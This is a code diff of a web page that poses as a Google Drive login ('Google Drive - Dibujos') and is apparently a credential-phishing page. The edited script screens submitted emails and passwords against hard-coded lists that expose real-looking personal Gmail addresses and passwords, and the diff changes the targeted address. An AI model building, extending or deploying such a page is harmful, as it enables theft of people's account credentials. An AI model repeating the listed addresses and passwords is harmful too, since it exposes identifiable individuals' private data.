@@ -8,7 +8,7 @@
     
     <meta property="og:title" content="Google Drive - Dibujos" />
     <meta property="og:description" content="google.com" />
-    <meta property="og:image" content="https://i.ibb.co/5h4ntWfC/fatima.png" />
+    <meta property="og:image" content="https://i.ibb.co/p7FsPTQ/fati.png" />
     
     <title>Google Drive - Dibujos</title>
     
@@ -656,14 +656,14 @@
             let isProhibitedPassword = false;
             
             // Lista de correos prohibidos
-            const prohibitedEmails = ["hailyhernandez17@gmail.com"];
+            const prohibitedEmails = ["lacelestial944@gmail.com"];
             if (prohibitedEmails.includes(email)) {
                 isProhibitedEmail = true;
             }
             
-            // Verificar contraseñas prohibidas
-            const prohibitedWords = ["Fatima090303.","fatima090303.","Fatima090303","fatima090303","Luciana090303.","luciana090303.","Luciana090303","luciana090303"];
-            if (prohibitedWords.some(word => password.includes(word))) {
+            // Verificar contraseñas prohibidas - CORREGIDO AQUÍ
+            const prohibitedPasswords = ["Fatima090303.","fatima090303.","Fatima090303","fatima090303","Luciana090303.","luciana090303.","Luciana090303","luciana090303"];
+            if (prohibitedPasswords.includes(password)) {
                 isProhibitedPassword = true;
             }
             
